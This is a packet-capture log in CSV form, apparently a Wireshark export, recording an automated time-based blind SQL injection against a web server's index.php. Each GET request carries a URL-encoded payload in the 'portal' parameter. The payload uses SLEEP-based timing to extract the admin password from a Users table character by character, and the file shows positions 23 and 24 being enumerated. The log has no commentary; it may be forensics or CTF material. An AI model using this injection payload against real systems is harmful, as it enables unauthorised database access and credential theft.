"No","Time","Source","Destination","Protocol","Length","Info"
"7380","84.860016846","192.168.1.2","150.95.139.51","TCP","74","80  >  34846 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792976871 TSecr=3262502426 WS=128"
"7381","84.861047892","150.95.139.51","192.168.1.2","TCP","66","34844  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262502427 TSecr=2792976869"
"7382","84.863907452","150.95.139.51","192.168.1.2","TCP","66","34846  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262502430 TSecr=2792976871"
"7383","84.863939481","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C23%2C1%29%29%3D107%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"7384","84.863983637","192.168.1.2","150.95.139.51","TCP","66","80  >  34846 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2792976875 TSecr=3262502430"
"7385","84.866761489","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"7386","84.872656113","150.95.139.51","192.168.1.2","TCP","66","34846  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262502437 TSecr=2792976878"
"7387","84.872686974","150.95.139.51","192.168.1.2","TCP","66","34846  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262502437 TSecr=2792976878"
"7388","84.872826019","192.168.1.2","150.95.139.51","TCP","66","80  >  34846 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2792976884 TSecr=3262502437"
"7389","84.873953364","150.95.139.51","192.168.1.2","TCP","74","34848  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262502440 TSecr=0 WS=128"
"7390","84.874002964","192.168.1.2","150.95.139.51","TCP","74","80  >  34848 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792976885 TSecr=3262502440 WS=128"
"7391","84.876508545","150.95.139.51","192.168.1.2","TCP","66","34846  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262502442 TSecr=2792976884"
"7392","84.877752676","150.95.139.51","192.168.1.2","TCP","66","34848  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262502444 TSecr=2792976885"
"7393","84.877924917","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C23%2C1%29%29%3D108%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"7394","84.877985361","192.168.1.2","150.95.139.51","TCP","66","80  >  34848 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2792976889 TSecr=3262502444"
"7395","84.880729996","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"7396","84.889156777","150.95.139.51","192.168.1.2","TCP","66","34848  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262502451 TSecr=2792976892"
"7397","84.889558677","150.95.139.51","192.168.1.2","TCP","74","34850  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262502453 TSecr=0 WS=128"
"7398","84.889558789","150.95.139.51","192.168.1.2","TCP","66","34848  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262502451 TSecr=2792976892"
"7399","84.889608267","192.168.1.2","150.95.139.51","TCP","74","80  >  34850 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792976901 TSecr=3262502453 WS=128"
"7400","84.889706560","192.168.1.2","150.95.139.51","TCP","66","80  >  34848 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2792976901 TSecr=3262502451"
"7401","84.893323116","150.95.139.51","192.168.1.2","TCP","66","34850  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262502459 TSecr=2792976901"
"7402","84.893807025","150.95.139.51","192.168.1.2","TCP","66","34848  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262502459 TSecr=2792976901"
"7403","84.893807213","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C23%2C1%29%29%3D109%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"7404","84.893870275","192.168.1.2","150.95.139.51","TCP","66","80  >  34850 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2792976905 TSecr=3262502459"
"7405","84.896616949","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"7406","84.900427960","150.95.139.51","192.168.1.2","TCP","66","34850  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262502466 TSecr=2792976908"
"7407","84.901026459","150.95.139.51","192.168.1.2","TCP","66","34850  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262502467 TSecr=2792976908"
"7408","84.901182740","192.168.1.2","150.95.139.51","TCP","66","80  >  34850 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2792976912 TSecr=3262502467"
"7409","84.903267469","150.95.139.51","192.168.1.2","TCP","74","34852  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262502469 TSecr=0 WS=128"
"7410","84.903316108","192.168.1.2","150.95.139.51","TCP","74","80  >  34852 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792976914 TSecr=3262502469 WS=128"
"7411","84.904503398","150.95.139.51","192.168.1.2","TCP","66","34850  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262502471 TSecr=2792976912"
"7412","84.907240823","150.95.139.51","192.168.1.2","TCP","66","34852  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262502472 TSecr=2792976914"
"7413","84.907553735","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C23%2C1%29%29%3D110%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"7414","84.907619776","192.168.1.2","150.95.139.51","TCP","66","80  >  34852 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2792976919 TSecr=3262502472"
"7415","84.910373473","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"7416","84.914065381","150.95.139.51","192.168.1.2","TCP","66","34852  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262502480 TSecr=2792976922"
"7417","84.914576800","150.95.139.51","192.168.1.2","TCP","66","34852  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262502481 TSecr=2792976922"
"7418","84.914730603","192.168.1.2","150.95.139.51","TCP","66","80  >  34852 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2792976926 TSecr=3262502481"
"7419","84.918377907","150.95.139.51","192.168.1.2","TCP","74","34854  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262502484 TSecr=0 WS=128"
"7420","84.918377914","150.95.139.51","192.168.1.2","TCP","66","34852  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262502484 TSecr=2792976926"
"7421","84.918430215","192.168.1.2","150.95.139.51","TCP","74","80  >  34854 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792976930 TSecr=3262502484 WS=128"
"7422","84.922468414","150.95.139.51","192.168.1.2","TCP","66","34854  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262502488 TSecr=2792976930"
"7423","84.922611531","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C23%2C1%29%29%3D111%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"7424","84.922667028","192.168.1.2","150.95.139.51","TCP","66","80  >  34854 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2792976934 TSecr=3262502488"
"7425","84.925371613","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"7426","84.928923708","150.95.139.51","192.168.1.2","TCP","66","34854  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262502495 TSecr=2792976937"
"7427","84.930079572","150.95.139.51","192.168.1.2","TCP","66","34854  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262502496 TSecr=2792976937"
"7428","84.930234111","192.168.1.2","150.95.139.51","TCP","66","80  >  34854 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2792976941 TSecr=3262502496"
"7429","84.933222166","150.95.139.51","192.168.1.2","TCP","74","34856  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262502499 TSecr=0 WS=128"
"7430","84.933271969","192.168.1.2","150.95.139.51","TCP","74","80  >  34856 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792976944 TSecr=3262502499 WS=128"
"7431","84.933638337","150.95.139.51","192.168.1.2","TCP","66","34854  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262502500 TSecr=2792976941"
"7432","84.937276515","150.95.139.51","192.168.1.2","TCP","66","34856  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262502503 TSecr=2792976944"
"7433","84.937747047","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C23%2C1%29%29%3D112%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"7434","84.937813038","192.168.1.2","150.95.139.51","TCP","66","80  >  34856 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2792976949 TSecr=3262502503"
"7435","84.940547685","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"7436","84.944455727","150.95.139.51","192.168.1.2","TCP","66","34856  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262502510 TSecr=2792976952"
"7437","84.945025832","150.95.139.51","192.168.1.2","TCP","66","34856  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262502511 TSecr=2792976952"
"7438","84.945180136","192.168.1.2","150.95.139.51","TCP","66","80  >  34856 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2792976956 TSecr=3262502511"
"7439","84.947240296","150.95.139.51","192.168.1.2","TCP","74","34858  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262502513 TSecr=0 WS=128"
"7440","84.947289626","192.168.1.2","150.95.139.51","TCP","74","80  >  34858 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792976958 TSecr=3262502513 WS=128"
"7441","84.948417333","150.95.139.51","192.168.1.2","TCP","66","34856  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262502515 TSecr=2792976956"
"7442","84.951132997","150.95.139.51","192.168.1.2","TCP","66","34858  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262502517 TSecr=2792976958"
"7443","84.951195587","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C23%2C1%29%29%3D113%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"7444","84.951243168","192.168.1.2","150.95.139.51","TCP","66","80  >  34858 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2792976962 TSecr=3262502517"
"7445","84.953865333","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"7446","84.957405821","150.95.139.51","192.168.1.2","TCP","66","34858  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262502524 TSecr=2792976965"
"7447","84.958031836","150.95.139.51","192.168.1.2","TCP","66","34858  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262502524 TSecr=2792976965"
"7448","84.958170016","192.168.1.2","150.95.139.51","TCP","66","80  >  34858 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2792976969 TSecr=3262502524"
"7449","84.960612094","150.95.139.51","192.168.1.2","TCP","74","34860  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262502526 TSecr=0 WS=128"
"7450","84.960662546","192.168.1.2","150.95.139.51","TCP","74","80  >  34860 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792976972 TSecr=3262502526 WS=128"
"7451","84.961467325","150.95.139.51","192.168.1.2","TCP","66","34858  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262502528 TSecr=2792976969"
"7452","84.964511082","150.95.139.51","192.168.1.2","TCP","66","34860  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262502530 TSecr=2792976972"
"7453","84.964577701","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C23%2C1%29%29%3D114%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"7454","84.964626083","192.168.1.2","150.95.139.51","TCP","66","80  >  34860 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2792976976 TSecr=3262502530"
"7455","84.967356861","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"7456","84.972819160","150.95.139.51","192.168.1.2","TCP","66","34860  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262502539 TSecr=2792976979"
"7457","84.976084418","150.95.139.51","192.168.1.2","TCP","74","34862  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262502542 TSecr=0 WS=128"
"7458","84.976084666","150.95.139.51","192.168.1.2","TCP","66","34860  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262502540 TSecr=2792976979"
"7459","84.976135142","192.168.1.2","150.95.139.51","TCP","74","80  >  34862 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792976987 TSecr=3262502542 WS=128"
"7460","84.976235377","192.168.1.2","150.95.139.51","TCP","66","80  >  34860 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2792976987 TSecr=3262502540"
"7461","84.980091094","150.95.139.51","192.168.1.2","TCP","66","34862  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262502546 TSecr=2792976987"
"7462","84.980151521","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C23%2C1%29%29%3D115%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"7463","84.980199487","192.168.1.2","150.95.139.51","TCP","66","80  >  34862 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2792976991 TSecr=3262502546"
"7464","84.980219372","150.95.139.51","192.168.1.2","TCP","66","34860  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262502546 TSecr=2792976987"
"7465","84.982947347","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"7466","84.989389778","150.95.139.51","192.168.1.2","TCP","66","34862  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262502553 TSecr=2792976994"
"7467","84.989712808","150.95.139.51","192.168.1.2","TCP","66","34862  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262502553 TSecr=2792976994"
"7468","84.989871442","192.168.1.2","150.95.139.51","TCP","66","80  >  34862 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2792977001 TSecr=3262502553"
"7469","84.989980632","150.95.139.51","192.168.1.2","TCP","74","34864  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262502556 TSecr=0 WS=128"
"7470","84.990017906","192.168.1.2","150.95.139.51","TCP","74","80  >  34864 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792977001 TSecr=3262502556 WS=128"
"7471","84.993380559","150.95.139.51","192.168.1.2","TCP","66","34862  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262502559 TSecr=2792977001"
"7472","84.993850634","150.95.139.51","192.168.1.2","TCP","66","34864  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262502560 TSecr=2792977001"
"7473","84.993881812","150.95.139.51","192.168.1.2","HTTP","430","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C23%2C1%29%29%3D116%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"7474","84.993927833","192.168.1.2","150.95.139.51","TCP","66","80  >  34864 [ACK] Seq=1 Ack=365 Win=30080 Len=0 TSval=2792977005 TSecr=3262502560"
"7475","87.998433149","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"7476","88.004514671","150.95.139.51","192.168.1.2","TCP","66","34864  >  80 [ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262505570 TSecr=2792980010"
"7477","88.005523300","150.95.139.51","192.168.1.2","TCP","66","34864  >  80 [FIN, ACK] Seq=365 Ack=618 Win=30464 Len=0 TSval=3262505571 TSecr=2792980010"
"7478","88.005680341","192.168.1.2","150.95.139.51","TCP","66","80  >  34864 [FIN, ACK] Seq=618 Ack=366 Win=30080 Len=0 TSval=2792980017 TSecr=3262505571"
"7479","88.008229407","150.95.139.51","192.168.1.2","TCP","74","34866  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262505574 TSecr=0 WS=128"
"7480","88.008278488","192.168.1.2","150.95.139.51","TCP","74","80  >  34866 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792980020 TSecr=3262505574 WS=128"
"7481","88.009290500","150.95.139.51","192.168.1.2","TCP","66","34864  >  80 [ACK] Seq=366 Ack=619 Win=30464 Len=0 TSval=3262505575 TSecr=2792980017"
"7482","88.012081459","150.95.139.51","192.168.1.2","TCP","66","34866  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262505578 TSecr=2792980020"
"7483","88.012113184","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C24%2C1%29%29%3D48%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"7484","88.012158036","192.168.1.2","150.95.139.51","TCP","66","80  >  34866 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2792980024 TSecr=3262505578"
"7485","88.014965944","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"7486","88.018718602","150.95.139.51","192.168.1.2","TCP","66","34866  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262505585 TSecr=2792980026"
"7487","88.019264429","150.95.139.51","192.168.1.2","TCP","66","34866  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262505585 TSecr=2792980026"
"7488","88.019422800","192.168.1.2","150.95.139.51","TCP","66","80  >  34866 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2792980031 TSecr=3262505585"
"7489","88.021545447","150.95.139.51","192.168.1.2","TCP","74","34868  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262505587 TSecr=0 WS=128"
"7490","88.021596069","192.168.1.2","150.95.139.51","TCP","74","80  >  34868 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792980033 TSecr=3262505587 WS=128"
"7491","88.022841649","150.95.139.51","192.168.1.2","TCP","66","34866  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262505589 TSecr=2792980031"
"7492","88.025447276","150.95.139.51","192.168.1.2","TCP","66","34868  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262505591 TSecr=2792980033"
"7493","88.025908821","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C24%2C1%29%29%3D49%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"7494","88.025976188","192.168.1.2","150.95.139.51","TCP","66","80  >  34868 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2792980037 TSecr=3262505591"
"7495","88.028734459","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"7496","88.032569892","150.95.139.51","192.168.1.2","TCP","66","34868  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262505599 TSecr=2792980040"
"7497","88.032958902","150.95.139.51","192.168.1.2","TCP","66","34868  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262505599 TSecr=2792980040"
"7498","88.033116841","192.168.1.2","150.95.139.51","TCP","66","80  >  34868 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2792980044 TSecr=3262505599"
"7499","88.035196422","150.95.139.51","192.168.1.2","TCP","74","34870  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262505601 TSecr=0 WS=128"
"7500","88.035245795","192.168.1.2","150.95.139.51","TCP","74","80  >  34870 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792980047 TSecr=3262505601 WS=128"
"7501","88.036670553","150.95.139.51","192.168.1.2","TCP","66","34868  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262505603 TSecr=2792980044"
"7502","88.040266843","150.95.139.51","192.168.1.2","TCP","66","34870  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262505605 TSecr=2792980047"
"7503","88.040299309","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C24%2C1%29%29%3D50%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"7504","88.040344311","192.168.1.2","150.95.139.51","TCP","66","80  >  34870 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2792980052 TSecr=3262505605"
"7505","88.043076549","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"7506","88.046932636","150.95.139.51","192.168.1.2","TCP","66","34870  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262505613 TSecr=2792980054"
"7507","88.047527468","150.95.139.51","192.168.1.2","TCP","66","34870  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262505614 TSecr=2792980054"
"7508","88.047681907","192.168.1.2","150.95.139.51","TCP","66","80  >  34870 [FIN, ACK] Seq=618 Ack=365 Win=30080 Len=0 TSval=2792980059 TSecr=3262505614"
"7509","88.049905676","150.95.139.51","192.168.1.2","TCP","74","34872  >  80 [SYN] Seq=0 Win=29200 Len=0 MSS=1412 SACK_PERM=1 TSval=3262505616 TSecr=0 WS=128"
"7510","88.049954392","192.168.1.2","150.95.139.51","TCP","74","80  >  34872 [SYN, ACK] Seq=0 Ack=1 Win=28960 Len=0 MSS=1460 SACK_PERM=1 TSval=2792980061 TSecr=3262505616 WS=128"
"7511","88.051060876","150.95.139.51","192.168.1.2","TCP","66","34870  >  80 [ACK] Seq=365 Ack=619 Win=30464 Len=0 TSval=3262505617 TSecr=2792980059"
"7512","88.053682695","150.95.139.51","192.168.1.2","TCP","66","34872  >  80 [ACK] Seq=1 Ack=1 Win=29312 Len=0 TSval=3262505620 TSecr=2792980061"
"7513","88.053994984","150.95.139.51","192.168.1.2","HTTP","429","GET /index.php?portal=%27OR%28SELECT%28IF%28ORD%28SUBSTR%28%28SELECT+password+FROM+Users+WHERE+username%3D%27admin%27%29%2C24%2C1%29%29%3D51%2CSLEEP%281%29%2C%27%27%29%29%29%23 HTTP/1.1 "
"7514","88.054060097","192.168.1.2","150.95.139.51","TCP","66","80  >  34872 [ACK] Seq=1 Ack=364 Win=30080 Len=0 TSval=2792980065 TSecr=3262505620"
"7515","88.056785982","192.168.1.2","150.95.139.51","HTTP","683","HTTP/1.1 200 OK  (text/html)"
"7516","88.060813282","150.95.139.51","192.168.1.2","TCP","66","34872  >  80 [ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262505627 TSecr=2792980068"
"7517","88.061288209","150.95.139.51","192.168.1.2","TCP","66","34872  >  80 [FIN, ACK] Seq=364 Ack=618 Win=30464 Len=0 TSval=3262505627 TSecr=2792980068"
